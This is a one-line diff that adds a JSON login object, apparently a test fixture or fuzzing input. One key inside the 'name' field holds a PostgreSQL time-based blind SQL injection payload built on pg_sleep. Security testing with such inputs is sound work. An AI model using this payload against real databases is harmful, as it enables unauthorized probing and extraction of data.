@@ -1,0 +1,1 @@
+{"name":{"0":"u1","0||(SELECT CASE WHEN (1=1) THEN pg_sleep(2) ELSE pg_sleep(0) END)::text":"a"},"pass":"a"}
